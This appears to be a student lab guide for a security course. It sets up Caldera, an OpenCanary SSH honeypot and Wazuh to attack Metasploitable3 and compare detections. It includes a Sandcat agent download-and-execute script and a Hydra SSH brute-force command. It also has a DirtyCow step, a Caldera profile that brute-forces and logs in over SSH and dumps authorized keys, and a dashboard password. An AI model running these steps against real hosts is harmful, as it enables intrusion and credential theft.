# ICS344

---

# Installation, Configuration, and Attack Execution Steps

This document provides a detailed guide to installing the necessary tools, configuring the environments, and performing the attacks in the project.

---

## 1. Prerequisites

### Tools and Software Required:
- **Kali Linux**: The primary platform for conducting attacks.
- **Metasploitable3**: The target vulnerable machine simulating a real SSH service.
- **Debian**: The host machine for the honeypot, it can be any OS/Distro.
- **Caldera**: An adversary emulation platform designed to easily run autonomous breach-and-attack simulation exercises.
- **Opencanary**: A lightweight honeypot for simulating SSH activity.
- **Wazuh**: A SIEM tool for monitoring and analyzing attack patterns.
- **Docker**: To deploy Wazuh easily [Kali only].

Ensure the following packages are installed:
- Kali:
   - `curl`
   - `git`
   - `python3` (Version < 3.12)
   - `pip`
   - `ssh`
   - `nmap`
   - `hydra`
   - `sshpass`
   - `wget`
- Debian:
   - `curl`
   - `git`
   - `python3` (Version > 3.7)
   - `pip`
   - `ssh`
   - `hydra`
   - `sshpass`
   - `wget`
- Metasploitable3:
   - `hydra`
   - `sshpass`
   - `wget`

---

## 2. Installing the Necessary Tools

### 2.1 Install Caldera
1. Install **Node.js** and **Go**:
   > Make sure to install the correct architecture for your host machine.
   ```bash
   curl -fsSL https://deb.nodesource.com/setup_20.18.1 | sudo -E bash -
   sudo apt install -y nodejs
   node -v
   sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.23.4.linux-amd64.tar.gz
   export PATH=$PATH:/usr/local/go/bin
   go version
   ```

2. Clone the Caldera repository and set up the environment:
   > Only for the first run of Caldera you need to use the flag ```--build```, on next runs just run the server normally.
   ```bash
   git clone https://github.com/mitre/caldera.git --recursive
   cd caldera
   python3 -m venv venv
   source venv/bin/activate
   pip install -r requirements.txt
   python3 server.py --build
   ```
3. Save the password for ```red``` account, then usnig the browser navigate to port ```8888``` on localhost and login.

### 2.2 Deploy Sandcat Agent
1. Create a batch file for deploying the agent on Metasploitable3 and Debian:
   ```bash
   nano <file_name>.sh
   ```
2. Add the following script to the file, do not forget to change the IP address:
   ```bash
   server="http://<Kali_IP>:8888";
   curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:" $server/file/download > splunkd;
   chmod +x splunkd;
   ./splunkd -server $server -group red -v
   ```
3. Then run the shell script:
   ```bash
   sudo ./<file_name>.sh
   ```
   > After running the script, comment the ```curl``` line so that it will not download the agent each time.

### 2.3 Install Opencanary Honeypot
1. Set up a virtual environment and install Opencanary on Debian machine:
   ```bash
   python3 -m venv opencanary
   source opencanary/bin/activate
   pip install opencanary
   ```

2. Configure Opencanary to simulate an SSH service:
   > The configration file can be found in ```/etc/opencanaryd/opencanary.conf```
   ```json
   {
       "device.node_id": "opencanary-1",
       "logging": {
           "file": {
               "enabled": true,
               "format": "%(asctime)s - %(message)s",
               "path": "opencanary.log"
           }
       },
       "ssh": {
           "enabled": true,
           "port": 22
       }
   }
   ```
3. Run the honeypot:
   ```bash
   opencanaryd --start --uid=nobody --gid=nogroup
   ```

### 2.4 Install Wazuh
1. Deploy Wazuh using Docker:
   Clonoe the repository from GitHub:
   ```bash
   git clone https://github.com/wazuh/wazuh-docker.git -b v4.9.2
   cd signle-node
   docker-compose -f generate-indexer-certs.yml run --rm generator
   ```
   Run Wazuh
   ```bash
   docker-compose up
   ```
2. Access the Wazuh dashboard at `http://127.0.0.1/app` using ```admin:SecretPassword``` and configure agents to collect logs from the SSH service and honeypot.

### 2.5 Deploy Wazuh Agent
1. Run the follownig cammand for deploying the agent on Metasploitable3 and Debian:
   > Change the architecture depending on your host machine, and add the IP address of Kali as well as the agent name. 
   ```bash
   wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.9.2-1_<ARCH>.deb && sudo WAZUH_MANAGER=<Kali_IP> WAZUH_AGENT_NAME=<Agent_name> dpkg -i ./wazuh-agent_4.9.2-1_<ARCH>.deb
   ```
   > For Metasplotable3, you can download the agent file on Kali, then transfer it to Metasploitable3 using FTP/netcat and run ```dpkg -i ./wazuh-agent_4.9.2-1_<ARCH>.deb```
2. Start the agent as background service:
   ```bash
   sudo systemctl daemon-reload
   sudo systemctl enable wazuh-agent
   sudo systemctl start wazuh-agent
   ```

---

## 3. Configuring and Performing Attacks

### 3.1 Perform Attacks Manually 
1. **Brute Force SSH Attack**:
   Execute Hydra:
   ```bash
   hydra -L /path/to/user.txt -P /path/to/pass.txt ssh://<Target_IP> -t 4 -o results.txt
   ```
2. **Privilege Escalation**:
   Use the DirtyCow exploit:
   ```bash
   ./dirtycow
   ```
3. **File and Directory Discovery**:
   ```bash
   cd $HOME && find . -print > /tmp/T1083.txt
   ```
4. **Extract SSH Keys**:
   ```bash
   cat ~/.ssh/authorized_keys
   ```

### 3.2 Configure Caldera Adversary Profile
Create a profile for the SSH attack:
```yaml
id: 93b4564b-3ce7-465f-8a64-71c02b2cc7ce
name: SSH Compromiser 1
description: ---
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- c44e5e7c-7a1e-4741-9e20-00b927c7bf3e
- 550bf3d1-4849-4372-91af-1801113a8347
- 9590a894-8c72-49ed-abb7-0bd1e8d49d17
- 01628dc5-be13-465d-8e91-3a02e0e42606
abilities:
 c44e5e7c-7a1e-4741-9e20-00b927c7bf3e:
  name:  Brute Force SSH and Login 1
  tactic:  credential-access
  technique_name:  "Account Discovery"
  technique_id:  T1110.001
  executors: 
   - sh:
     platform: linux
     command: |
        IP="192.168.56.105";
        PORT="22";
        USERLIST="/home/tada/Downloads/user.txt";
        PASSLIST="/home/tada/Downloads/pass.txt";
        RESULTFILE="/home/tada/Downloads/ssh_crack.txt";
        
        echo "[*] Starting Hydra brute-force, server= $IP";
        rm -rf $RESULTFILE;
        hydra -L "$USERLIST" -P "$PASSLIST" ssh://$IP -t 4 -o "$RESULTFILE";
        
        if grep -q "login:" "$RESULTFILE"; then
          echo "[*] Credentials found!";    
          username=$(grep "login:" "$RESULTFILE" | awk '{print $5}');
          password=$(grep "login:" "$RESULTFILE" | awk '{print $7}');
          echo "[*] Using credentials: $username : $password";
          sshpass -p "$password" ssh -o StrictHostKeyChecking=no -p $PORT $username@$IP;
          if [[ $? -ne 0 ]]; then
            exit 1;
          fi;
          echo "[*] Logged in as user: $username";
          exit;
        else
          echo "[!] No valid credentials found by Hydra.";
          exit 1;
        fi
 550bf3d1-4849-4372-91af-1801113a8347:
  name:  Using DirtyCow to gain privilege (Require dirtycow) 1
  tactic:  privilege-escalation
  technique_name:  "Exploitation for Privilege Escalation"
  technique_id:  T1068
  executors: 
   - sh:
     platform: linux
     command: |
        echo "user_first : $(whoami)"
        nohup ./dev/null/dirtycow 1>/dev/null 2>/dev/null;
        echo "user_become: $(whoami)"
 9590a894-8c72-49ed-abb7-0bd1e8d49d17:
  name:  Nix File and Directory Discovery 2/1
  tactic:  discovery
  technique_name:  "File and Directory Discovery"
  technique_id:  T1083
  executors: 
   - sh:
     platform: linux
     command: |
       
        cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name ".*"
 01628dc5-be13-465d-8e91-3a02e0e42606:
  name:  Extract SSH Keys 1
  tactic:  credential-access
  technique_name:  "Credential Dumping"
  technique_id:  T1003
  executors: 
   - sh:
     platform: linux
     command: |
       
        if [ -f ~/.ssh/authorized_keys ]; then
          cp ~/.ssh/authorized_keys ~/.ssh/authorized_keys.bak;
          ssh_authorized_keys=$(cat ~/.ssh/authorized_keys);
          echo "$ssh_authorized_keys";
        fi

```

---

## 4. Monitoring and Analysis with Wazuh

1. **Forward Logs to Wazuh**:
   Configure agents to monitor logs from:
   - The real SSH service (Metasploitable3)
   - The honeypot (Opencanary)

2. **Analyze Data**:
   - Use the Wazuh dashboard to view "Alerts Evolution Over Time."
   - Evaluate detected tactics using MITRE ATT&CK mappings.

3. **Identify Anomalies**:
   - Compare patterns between the real service and honeypot.
   - Assess effectiveness of the honeypot in mimicking the real service.

---

## 5. Summary

This guide covered the installation, configuration, and execution of attacks using Caldera, Opencanary, and Wazuh. The methods provide insights into the effectiveness of automated and manual attacks while highlighting the differences between a real service and a honeypot.
